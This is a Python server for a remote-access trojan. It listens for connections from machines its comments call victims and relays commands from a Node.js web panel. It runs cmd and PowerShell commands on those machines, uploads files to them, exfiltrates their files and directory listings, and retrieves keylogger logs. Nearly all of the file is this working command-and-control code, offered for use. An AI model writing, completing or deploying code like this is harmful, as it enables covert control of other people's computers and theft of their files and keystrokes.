import socket
from _thread import *
import json
import os
import json

FILE_WAS_SENT = "100@"  # The file was sent
CANT_OPEN_FILE = "200@"  # Cant open the file successfully
COMMAND_NOT_FOUND = "300@"  # Cant open find the command
CANT_OPEN_HANDLE = "400@"  # Cant open handle
HANDLE_WAS_OPENED = "500@"  # Handle was opened successfully
FILE_OPENED = "600@"  # The file was opened
FILE_EXIST = "700@"  # The file is existing
FILE_NOT_EXIST = "800@"  # The file is not exist


class Server:
    port = None
    ip = None
    listen_count = None
    client_name = ''
    sockets_ip = {}

    def __init__(self, port, ip, listen_count, client_name):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count
        self.client_name = client_name
        self.s = socket.socket()
        self.s.bind(('0.0.0.0', self.port))
        self.s.listen(self.listen_count)

    def start_server_listen(self):
        pass
        # self.server_socket, self.adress = self.s.accept()

    def connect_to_web(self):
        self.sock = socket.socket()
        self.sock.bind((self.ip, 6666))
        self.sock.listen(self.listen_count)
        self.sock.listen(1)
        self.web_server_socket, self.web_adress = self.sock.accept()
        print('connected to node.js')

    def runThread(self):
        self.connect_to_web()
        # self.start_server_listen()
        # print('connected to victim')
        self.get_command_from_server()

    def receive_file_from_client(self, path_to_save, sock):
        if sock.recv(4).decode() != FILE_OPENED:
            self.web_server_socket.send("Cant open this file".encode())
            return
            # Take from the victim file
        if path_to_save == "":
            self.web_server_socket.send("Where do you want save the file?".encode())
            data = self.web_server_socket.recv(1024).decode()
            print('data is ' + json.loads(data)[0])
            path_to_save = json.loads(data)[0]

        total_file_size = 0
        file_size = sock.recv(15).decode('utf-8', 'ignore')
        file_size = int(file_size.replace('$', ''))

        if file_size == CANT_OPEN_FILE:
            print("Cant open the file")
            self.web_server_socket.send("Cant open the file".encode())
            return
        print("File size is " + str(file_size))

        with open(path_to_save, 'wb')as f:
            print('Open File')
            self.web_server_socket.send("Open File".encode())
            while total_file_size != file_size:
                data = sock.recv(1024)
                print("Data length is " + str(len(data)))
                total_file_size += len(data)
                f.write(data)
                f.flush()
                print(total_file_size)

            f.flush()
            f.close()
        print("Final Total data length is " + str(total_file_size))
        print('done')
        sock.send("Finished!".encode())
        self.web_server_socket.send('Done!'.encode())

    def send_file_to_client(self, path, sock):
        # Send to the victim files
        self.web_server_socket.send("Where do you want to save the file".encode())
        victim_path = self.web_server_socket.recv(1024).decode()  # input('Where do you want save the file\n')
        print("victim path is " + json.loads(victim_path)[0])
        sock.send(json.loads(victim_path)[0].encode('utf-8'))

        if sock.recv(4).decode() != HANDLE_WAS_OPENED:
            self.web_server_socket.send("Cant open handle to the file".encode())
            return

        file_size = str(os.path.getsize(path))
        if len(file_size) < 15:
            for i in range(len(file_size), 15):
                file_size += "$"

        print("file size is " + str(file_size))
        sock.send(str(file_size).encode())

        with open(path, 'rb')as f:
            for line in f.readlines():
                sock.send(line)

        f.close()
        f.close()

        # self.web_server_socket.send(self.sock.recv(17))
        if sock.recv(4).decode() != FILE_WAS_SENT:
            self.web_server_socket.send("The file wasn't sent".encode())
            return

        self.web_server_socket.send("The file was sent to the victim successfully!".encode())

    def get_command_from_server(self):
        start_new_thread(self.wait_for_connections, ())
        while True:
            try:
                command = json.loads(self.web_server_socket.recv(1024).decode())
                print(command)
                self.run_command(command[0], self.sockets_ip[command[1]])
            except socket.error as e:
                del self.web_server_socket
                print("There is an error")
                print(e)
                self.connect_to_web()
                continue

    def wait_for_connections(self):
        while True:
            sock, addr = self.s.accept()
            print("New  connection")
            print(addr[0])
            self.sockets_ip[addr[0]] = sock
            self.web_server_socket.send(('Connected$ ' + addr[0]).encode())

    def run_command(self, command, sock):
        print("test")
        print(command)
        data = None

        if command.startswith('send file'):
            path = command[10:-1] + command[-1]
            # Checking if the file exist
            if not os.path.isfile(path):
                self.web_server_socket.send("This file is not exist!".encode())
                return
            sock.send(command.encode('utf-8'))
            self.send_file_to_client(path, sock)
            return

        sock.send(command.encode('utf-8'))

        # recv file (file name on victim computer)
        if command.startswith('recv file'):
            self.receive_file_from_client("", sock)

        # for sending cmd commands to victim computer
        elif command.startswith("cmd"):
            size = sock.recv(15).decode()
            size = size.replace('$', '')
            data = sock.recv(int(size))
            print(data.decode('utf-8', 'ignore'))
            self.web_server_socket.send(data)


        # for sending powershell commands to victim computer
        elif command.startswith("powershell"):
            size = sock.recv(15).decode()
            size = size.replace('$', '')
            data = sock.recv(int(size))
            print(data.decode('utf-8', 'ignore'))
            self.web_server_socket.send(data)


        elif command.startswith("get files"):
            data = sock.recv(20)
            data = data.replace(b'$', b'')
            try:
                data = sock.recv(int(data.decode())).decode()
                # print("Get files size is " + data)
                self.web_server_socket.send(data.encode())
                print(data.decode())
            except Exception as e:
                print(e)
                print(data)

        elif command.startswith("stop keylogger"):
            self.web_server_socket.send(sock.recv(50))
            self.receive_file_from_client("C:\\C_projects\\KeyloggerFile.txt", sock)


        elif command == 'exit':
            return

        elif command.startswith('listen'):
            self.receive_file_from_client("", sock)

        elif command == 'exit':
            sock.close()
            pass

        elif command == 'q':
            print("quitting")
            sock.close()
            self.web_server_socket.close()
            self.web_server_socket.send("Quitting!".encode())
            quit(1)

        else:
            data = sock.recv(1024).decode('utf-8')
            print(data)

            if data == COMMAND_NOT_FOUND:
                self.web_server_socket.send("The command was not found".encode())
                return
            self.web_server_socket.send(data.encode())
            return

    # self.server_socket.close()


myServer = Server(9087, '127.0.0.1', 1, 'client1')
myServer.runThread()
